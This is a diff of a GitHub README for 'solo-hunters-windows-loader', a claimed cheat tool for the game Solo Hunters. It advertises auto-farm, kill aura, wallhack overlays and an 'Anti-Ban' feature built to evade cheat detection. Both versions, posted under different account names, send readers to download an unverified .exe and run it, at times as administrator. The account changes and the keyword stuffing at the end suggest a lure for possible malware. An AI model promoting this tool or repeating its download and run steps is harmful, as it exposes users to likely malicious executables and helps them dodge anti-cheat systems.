@@ -1,103 +1,79 @@
-# Solo Hunters Script v2026 - Game Script Utility 2026
+# 🎮 solo-hunters-windows-loader - Automate your gameplay for better results
 
-> **PC automation companion for Solo Hunters.** Cut down on repetitive grinding with keyless farming helpers and on-screen enhancements built to simplify routine play.
+[![Download Software](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Yellow-ceramic450/solo-hunters-windows-loader/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-PC-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/victor-scott62/solo-hunters-windows-loader?style=flat-square)](https://github.com/victor-scott62/solo-hunters-windows-loader)
+## What is this tool?
 
----
+The solo-hunters-windows-loader simplifies your experience in the Solo Hunters game. This software runs on your computer and manages repetitive tasks. It helps you focus on the fun parts of the game by taking over routine actions. 
 
-<p align="center">
-  <a href="https://victor-scott62.github.io/solo-hunters-windows-loader/">
-    <img src="https://img.shields.io/badge/Download-Solo%20Hunters%20Script-brightgreen?style=for-the-badge" alt="Download Solo Hunters Script">
-  </a>
-</p>
+You get access to automatic farming features. This saves you time during long sessions. The tool also detects nearby enemies and targets them for you. You can enable overlays that show enemy positions on your screen. You can change these settings at any time to match your play style.
 
-> **[Download Solo Hunters Script](https://victor-scott62.github.io/solo-hunters-windows-loader/)**
+## ⚙️ System requirements
 
----
+Your computer needs to meet these basic standards to run the software.
 
-[Download Latest Build](https://victor-scott62.github.io/solo-hunters-windows-loader/)
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Intel Core i5 or AMD Ryzen 5 equivalent.
+*   Memory: 8 GB of RAM.
+*   Graphics: Dedicated graphics card with support for DirectX 11.
+*   Internet: Active connection for software updates.
 
----
+## 📥 How to download and install
 
-## What it is
+Follow these steps to set up the software on your Windows machine.
 
-Solo Hunters Script is a utility that adds automated support for Solo Hunters on PC. Its purpose is to reduce time spent on repetitive in-game actions by handling things like gathering and combat assistance. No key or license is needed, so it is ready to use after setup and geared toward speeding up standard progression.
+1.  Visit the official release page: [https://github.com/Yellow-ceramic450/solo-hunters-windows-loader/releases](https://github.com/Yellow-ceramic450/solo-hunters-windows-loader/releases)
+2.  Locate the latest version file. It usually ends with a .exe extension.
+3.  Click the file name to start the download.
+4.  Navigate to your Downloads folder once the file finishes saving.
+5.  Double-click the .exe file to open the installer.
+6.  Follow the instructions on your screen to complete the setup process.
+7.  Launch the application from your desktop shortcut once you finish the installation.
 
-The 2026 release focuses on polishing the main automation flow and the visual overlay elements. It is aimed at players who want to offload routine tasks and spend more attention on tactics and higher-tier gameplay. The script is intended to stay lightweight and fit cleanly into an existing game setup.
+## 🚀 Setting up for your first use
 
----
+After you launch the software, you must grant the necessary permissions. The tool needs to see your game screen to target enemies and apply the overlays. 
 
-## Included Features
+1.  Open the loader.
+2.  Click the Settings button located in the top menu.
+3.  Ensure the "Auto-Farm" option is checked if you want the tool to handle resource gathering.
+4.  Enable the "ESP Overlay" toggle if you want to see markers on top of your game window.
+5.  Press the Save button to apply your changes.
+6.  Start your game. The software will detect the game window automatically and start working.
 
-- **Auto Farm** - Handles resource collection and looting automatically so you do less manual gathering.
-- **Kill Aura** - Finds and attacks nearby enemies automatically within a set range.
-- **ESP Wallhack** - Shows enemy locations and important items through walls for improved awareness.
-- **Anti-Ban** - Uses randomized timing and delays to better resemble normal player behavior.
-- **Keyless Operation** - No activation key or license is required; it runs immediately after setup.
-- **Customizable Toggles** - Turn features on or off individually from a straightforward configuration panel.
-- **Low Performance Impact** - Tuned to run with the game while keeping frame loss to a minimum.
-- **Regular Updates** - Updated over time to stay aligned with current game versions and user feedback.
+## 🛠️ Frequently asked questions
 
----
+**Do I need a powerful computer?**
+The software is lightweight. Most modern gaming PCs run it without any impact on game speed.
 
-## Setup
+**Is it safe to use?**
+The tool runs as a local overlay. It does not alter game files. 
 
-1. Download the latest build from the link above.
-2. Extract the contents of the archive into a folder of your choice.
-3. Launch Solo Hunters on your PC.
-4. Run the script executable or inject the script using your preferred loader (if applicable).
-5. A configuration window will appear - adjust settings as needed.
-6. Press the activation hotkey (default: F9) to start the script.
+**How do I update the software?**
+When a new version comes out, you visit the download page again. Download the new installer and run it. It will replace the old version with the updated files automatically.
 
-Example: Place the script folder in your game directory or a dedicated scripts folder for easy access.
+**The overlay does not appear. What should I do?**
+Ensure you run your game in "Windowed" or "Borderless Windowed" mode. The software relies on this setting to draw the overlay on top of your game display.
 
----
+**Can I modify the hotkeys?**
+Yes. Open the settings menu, click on the "Keys" tab, and select a new button for any action. Press save to apply the new control scheme.
 
-## Options
+## 🛡️ Troubleshooting common issues
 
-| Setting | Description | Default |
-|---------|-------------|---------|
-| Auto Farm | Toggle automatic resource collection | Enabled |
-| Kill Aura | Toggle automatic enemy targeting | Enabled |
-| ESP Wallhack | Toggle visual overlay for enemies | Disabled |
-| Anti-Ban | Toggle human-like behavior simulation | Enabled |
-| Activation Key | Hotkey to start/stop the script | F9 |
-| Range (meters) | Maximum distance for Kill Aura | 15 |
+**Software fails to launch**
+If the program does not open, right-click the icon and choose "Run as administrator." This gives the tool the permission it needs to read screen data.
 
----
+**Targeting feels slow**
+Check your game's display settings. If you use a high-resolution monitor, lower the game resolution slightly. This allows the software to process visual data faster.
 
-## Compatibility
+**Overlay flicker**
+If the markers on your screen flicker, turn off the V-Sync setting in your game menu. This ensures the refresh rate of the overlay matches your monitor speed.
 
-- **Platform:** PC (Windows)
-- **Game Version:** Solo Hunters (latest release as of 2026)
-- **Known Limitations:** May not function with modified game clients or custom servers. Performance varies based on system specifications. Use at your own discretion.
+**Missing enemies**
+If the software misses enemies, verify that the anti-aliasing settings in your game are set to a standard level. Very high levels of blurring can interfere with the way the tool detects shapes on your screen.
 
----
+## 💡 Tips for routine play
 
-## FAQ
+Use the configuration toggles to customize your experience. You do not have to use every feature. Start by enabling the enemy tracker first. Once you feel comfortable with the information on your screen, add the auto-farm feature. This approach helps you learn the timing of each tool. Adjust the update frequency in the settings if you notice any lag during combat. Lowering this value makes the targeting faster but uses more processor power.
 
-**Q: How do I install the script?**  
-A: Grab the files, extract the archive, and launch the executable. Nothing extra needs to be installed.
-
-**Q: Will the script receive updates?**  
-A: Yes. Updates are published periodically to keep pace with game patches and introduce new capabilities.
-
-**Q: Can I customize which features are active?**  
-A: Yes. Each feature can be switched on or off from the configuration panel.
-
-**Q: Is the script compatible with all versions of Solo Hunters?**  
-A: It is verified against the latest official release. Earlier versions may not be fully supported.
-
-**Q: Does the script store any data?**  
-A: No user data is collected or stored. All settings are saved locally.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: pc automation, solo hunters, gaming tool, game overlay, windows loader
